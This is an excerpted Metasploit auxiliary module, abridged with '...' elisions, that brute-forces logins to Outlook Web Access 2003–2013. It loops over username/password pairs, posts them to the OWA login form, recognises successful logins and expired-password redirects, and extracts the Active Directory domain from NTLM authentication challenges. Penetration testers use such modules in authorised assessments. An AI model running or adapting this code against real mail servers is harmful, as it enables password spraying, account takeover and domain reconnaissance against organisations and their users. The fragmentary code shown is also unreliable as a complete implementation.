...
class Metasploit3 < Msf::Auxiliary
  ...
  def initialize
    super(
      ...
      'Description'    => %q{
        This module tests credentials on OWA 2003, 2007, 2010, 2013 
servers. The default
        ...
        [
          ...
          [
            'OWA_2010',
            {
              ...
              'InboxPath'   => '/owa/',
              'InboxCheck'  => 
/Inbox|location(\x20*)=(\x20*)"\\\/(\w+)\\\/logoff\.owa|A mailbox 
couldn\'t be found|\<a .+onclick="return JumpTo\('logoff\.aspx.+\">/
            }
          ],
          [
            'OWA_2013',
    ...
    register_options(
      [
        ...
        OptBool.new('ENUM_DOMAIN', [ true, "Automatically enumerate AD 
domain using NTLM authentication", true]),
        OptBool.new('AUTH_TIME', [ false, "Time HTTP authentication 
response(in seconds)", true]),
      ], self.class)


    register_advanced_options(
      [
        OptString.new('AD_DOMAIN', [ false, "Optional AD domain to 
prepend to usernames", ''])
      ], self.class)

    deregister_options('BLANK_PASSWORDS', 
'RHOSTS','PASSWORD','USERNAME')
  end
  ...
  def run
    ...
    # apparently you cannot do each_user_pass.empty? or even inspect() 
it
    isempty = true
    ...
    begin
      each_user_pass do |user, pass|
       ...
       #vprint_status("#{msg} Trying #{user} : #{pass}")
        try_user_pass({"user" => user, "domain"=>domain, "pass"=>pass, 
"auth_path"=>auth_path, "inbox_path"=>inbox_path, 
"login_check"=>login_check, "vhost"=>vhost})
      end
  ...
  def try_user_pass(opts)
    ...
    if (datastore['SSL'].to_s.match(/^(t|y|1)/i))
      if action.name == "OWA_2013"
        data = 'destination=https://' << vhost << 
'/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << 
pass << '&isUtf8=1'
      else
        data = 'destination=https://' << vhost << 
'&flags=0&trusted=0&username=' << user << '&password=' << pass
      end
    else
      if action.name == "OWA_2013"
        data = 'destination=http://' << vhost << 
'/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << 
pass << '&isUtf8=1'
      else
        data = 'destination=http://' << vhost << 
'&flags=0&trusted=0&username=' << user << '&password=' << pass
    ...
    if action.name != "OWA_2013" and res.get_cookies.empty?
        print_error("#{msg} Received invalid repsonse due to a missing 
cookie (possibly due to invalid version), aborting")
        return :abort
    end
    if action.name == "OWA_2013"
      #Check for a response code to make sure login was valid. Changes 
from 2010 to 2013.
      #Check if the password needs to be changed.
      if res.headers['location'] =~ /expiredpassword/
        print_good("#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : 
'#{pass}': NOTE password change required")
        report_hash = {
      ...
      #Login didn't work. no point on going on.
        vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : 
'#{pass}'")
        return :Skip_pass
      end
    else
...
Errno::ETIMEDOUT
      ...
      if res and res.code == 401 and 
res['WWW-Authenticate'].match(/^NTLM/i)
        hash = res['WWW-Authenticate'].split('NTLM ')[1]
        domain = 
Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/,'')
